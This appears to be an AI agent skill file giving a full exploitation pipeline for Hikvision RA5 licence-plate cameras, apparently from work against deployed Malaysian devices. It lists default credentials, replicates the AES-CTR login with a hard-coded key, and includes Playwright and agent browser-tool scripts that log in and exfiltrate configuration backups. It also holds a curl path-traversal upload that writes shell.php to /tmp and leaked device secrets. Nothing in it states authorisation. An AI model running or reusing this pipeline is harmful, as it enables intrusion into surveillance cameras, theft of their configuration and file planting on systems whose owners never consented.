---
name: hikvision-ra5-anpr-pwn
description: Full recon-to-exfil pipeline for Hikvision RA5 series ANPR cameras (RA556A-E99D). Login bypass via AES-CTR, config exfiltration, arbitrary file write, API mapping.
---

# Hikvision RA5 ANPR Camera Exploitation Pipeline

## Target Profile
- **Model**: RA556A-E99D (RA5-V1.0 hardware)
- **Software**: 8.10.1.202511270, system x295.u295.k295.r010
- **Web server**: Mongoose/7.9 (custom Hikvision fork, not standard ISAPI)
- **Region**: ASEAN (Malaysia) — algorithm ASEAN.2025112711
- **Default creds**: admin:admin (authority level 0 = administrator)
- **Product name**: 车辆身份识别智能相机 (Vehicle Identity Recognition Smart Camera)

## Attack Surface
| Port | Service | Notes |
|------|---------|-------|
| 80/HTTP | Mongoose web UI | All 295 spoofed ports serve same interface |
| 22/SSH | OpenSSH? | Banner filtered, reachable |
| 23/Telnet | BusyBox telnetd | telnet_open=1 in config, banner filtered |
| 8557/RTSP | RTSP server | Open, streaming |

## Key API Endpoints

### Authentication
- `login.htm` — JS-based login, uses `#username`, `#usrpwd`, `#submit`
- `getauth.php` — POST `{"type":"get_user_auth"}` returns authority level
- `verifypass.php` — POST AES-CTR encrypted `admin:admin` to authorize sensitive ops
- `webpage_relogin.php` — session check, returns `{"state":401}` on expiry

### Config / System
- `systemjson.php` — POST `{"type":"get_device_info"}` (or `ss_get_ntp_cfg`, etc.)
- `configbackup.php` — POST `{"type":"config_backup","body":{"general":1,"system":1,"security":1}}` AFTER verifypass.php
- `download.php/VzConfig/configbackupNN.cfg` — retrieve exported config
- `configrestore.cgi` — POST multipart file upload to restore config

### File Operations
- `file_upload.cgi?filepath=/media/feature/...` — upload to /media/ subtree
- `file_upload.cgi?filepath=/media/../../../tmp/...` — ARBITRARY FILE WRITE via path traversal!
- `file_download.php/...` — download files from /media/ paths

### Bus / Internal
- `vb.htm?boa_busjsonreq=<JSON>` — internal JSON bus (GET, JSON as URL param)
- `vb.htm?boa_eventjsonreq=<JSON>` — event bus
- `vb.htm?gethwinfo` — returns hardware info
- `vb.htm?getboardversioninfo` — returns board version (17996)
- `vb.htm?paratest=<cmd>` — test endpoints (channelnum, removeLoginBgfile, etc.)

### Live ANPR
- `ivs_result.php?{"result_id":N}` — live plate recognition results (polling)
- `avsjson.php` — audio/video streaming config
- `getivsctrl.php` — IVS control (binary protocol: `cmd:len:base64`)

### Misc
- `dgjson.php` — data grid JSON
- `dbopr.php` / `dboprnew.php` — database operations
- `request.php` — generic request handler
- `advert.cgi` — advertisement upload
- `upload.cgi` — firmware upload (format unknown, returns "All upload failed" for invalid)

## Login Flow (Critical — JS Required)

The camera uses AES-CTR encrypted login. Cannot authenticate with curl alone.

### AES-CTR Implementation
- **Library**: Custom `AesCtr` in `common_lib.js`
- **Key derivation**: Password UTF-8 encoded, padded to 16 bytes, then `Aes.Cipher(pwBytes, Aes.KeyExpansion(pwBytes))` — encrypts password with itself
- **Counter/Nonce**: 8 bytes — first 4 bytes = `floor(timestamp/1000)`, next 4 bytes = `timestamp % 1000` (repeated)
- **Key**: `"天天"` (tiāntiān, 2 Chinese chars = 6 bytes UTF-8)
- **nBits**: 128

### Login Steps
1. Load `login.htm` with Playwright (JS required to render form)
2. `await page.fill("#username", "admin")`
3. `await page.fill("#usrpwd", "admin")`
4. `await page.click("#submit")`
5. Wait for redirect to `**/main.htm`

### Session Cookies
- `sessionID=<numeric>` — main session token
- `outtext=<base64>` — AES-CTR encrypted `admin:admin` for remember-me

## Config Exfiltration Pipeline (Playwright)

```python
# Step 1: Login
await page.goto("http://TARGET/login.htm", wait_until="networkidle")
await page.wait_for_function("document.body.style.display !== 'none'")
await page.fill("#username", "admin")
await page.fill("#usrpwd", "admin")
await page.click("#submit")
await page.wait_for_url("**/main.htm")

# Step 2: Encrypt password using browser's own AesCtr
encrypted = await page.evaluate('AesCtr.encrypt("admin:admin", "天天", 128)')

# Step 3: Verify
await page.evaluate(f"""
    fetch("/verifypass.php", {{method:"POST", body:"{encrypted}"}})
""")

# Step 4: Request config backup
cfg = {"type": "config_backup", "body": {"general": 1, "system": 1, "security": 1}}
# POST to configbackup.php via fetch

# Step 5: Download
# Response has body.data = base64("download.php/VzConfig/configbackupNN.cfg")
# Fetch that URL to get the config file
```

### Config Format
- JSON-lines: each line is `{"data":"<base64>","enc_flag":0}` or meta `{"verify":"...","protocol":2,...}`
- Inner data: `{"key":"<config_key>","kv":<version>,"value":"<JSON or base64>"}`
- Security params at end of file (accounts, tcp_authinfo, net_security)
- `encrypt_level: 0` = plaintext (key "secret08" is vestigial)
- Account passwords shown as `"***"` (export redaction, NOT actual hash)

## References
- `references/hexstrike-api.md` — HexStrike AI v6.0.0 local API endpoints
- `references/pentagi-briefing-pattern.md` — Proper AI pentesting briefing technique

### Key Config Values
- `accounts` / `accounts_bak` — user accounts with authority levels
- `net_security` — `telnet_open: 1` means telnet enabled
- `tcp_authinfo` — `encrypt_key: "zkteco$dl"`, encryption methods list
- `net_port` — `http_port: 80, rtsp_port: 8557, ws_port: 9080`
- `web_auth_mode` — `auth_mode: 0`
- `web_login_restrain` — brute force protection config

## Arbitrary File Write
```bash
curl -b "sessionID=XXX; outtext=YYY" \
  -X POST -F "file=@payload;filename=shell.php" \
  "http://TARGET/file_upload.cgi?filepath=/media/../../../tmp/shell.php"
```
Works for `/tmp/` only — root `/` and `/cgi-bin/` blocked. CGI execution from `/tmp/` via URL path traversal resolves but interpreter not found (stripped BusyBox).

## Re-Authentication Dialog
Sensitive operations (security config export, import) trigger modal with `#identification_submit`. Flow:
1. `show_identification()` clears `#username`/`#usrpwd`, shows `#identificationModal`
2. User fills credentials → `identification()` validates username must be "admin"
3. Calls `AesCtr.encrypt("admin:" + pwd, "天天", 128)`
4. POSTs to `verifypass.php` → if "OK", calls `export_config()` or `import_config()`

## Playwright VPS Setup
```bash
python3 -m venv /tmp/pwenv
/tmp/pwenv/bin/pip install playwright pycryptodome
/tmp/pwenv/bin/python -m playwright install chromium
```
Set `PLAYWRIGHT_BROWSERS_PATH=/home/user/.cache/ms-playwright` if using npx-installed browsers.

## Hermes Built-in Browser (Alternative — No VPS Needed)

When the VPS isn't available or Playwright packaging is broken (Kali Node.js
path issues), use Hermes's built-in browser tools directly. They're faster
(no SSH round-trip, no driver setup) and work against JS-auth targets.

```python
# 1. Navigate to login
browser_navigate("http://TARGET/login.htm")
# → Empty snapshot initially (page renders via JS)

# 2. Wait for render, get form refs
browser_snapshot(full=True)
# → Shows: name textbox [ref=e2], Password textbox [ref=e3], Login text

# 3. Fill credentials
browser_type(ref="e2", text="admin")
browser_type(ref="e3", text="admin")

# 4. Submit
browser_press(key="Enter")
# → Redirects to dashboard: "Smart camera for vehicle identification"

# 5. API access from authenticated context
browser_console(expression="""
    (async () => {
        const r = await fetch("/systemjson.php", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({type: "get_device_info"})
        });
        return await r.text();
    })()
""")
```

Config exfil follows same pattern: browser_console calls AesCtr.encrypt(),
POSTs to verifypass.php, then requests + downloads config backup — all
from within the authenticated browser context.

See `references/browser-approach.md` for session transcript and Playwright
failure diagnostics.

## Pitfalls
- **Session drops**: Camera unstable, sessions expire quickly. Re-login often.
- **JS required**: NO curl-only auth. Playwright/Browserbase mandatory.
- **`display:none`**: Login form body starts hidden, must wait for JS to show it.
- **Button vs input**: Export is `<input type="submit" id="export">`, NOT `<button>`.
- **`common` vs `general`**: configbackup body uses `general` (from JS source), not `common`.
- **`type: "config_backup"`** not `"export"` — discovered in business.js `export_config()`.
- **Path traversal**: `/media/../..//tmp/` works (double-slash tolerated), relative `../` alone fails.
- **verifypass first**: configbackup.php returns 404 "Failure" unless verifypass.php was called first.
- **Password `"***"`**: Config export redacts passwords — they're NOT hashed (encrypt_level=0), just sanitized for output.
- **Camera crashes**: Mongoose web server crashes under heavy probing, recovers in 30-60s.
- **Browserbase iframe**: Content loaded in same-origin iframe, XHR/fetch blocked from parent context.
- **browser_console async**: Top-level `await` fails with `SyntaxError`. Must wrap in async IIFE: `(async () => { ... })()`. See `references/browser-approach.md`.

## Verified Credentials
| Service | Username | Password | Notes |
|---------|----------|----------|-------|
| Web UI | admin | admin | Authority 0 (admin) |
| Web UI (encrypted) | admin:admin | 天天 (key) | AES-CTR for internal API auth |
| TCP auth | — | zkteco$dl | encrypt_key for bus protocol |
| Config encrypt | — | secret08 | Level 0 (unused, plaintext mode) |
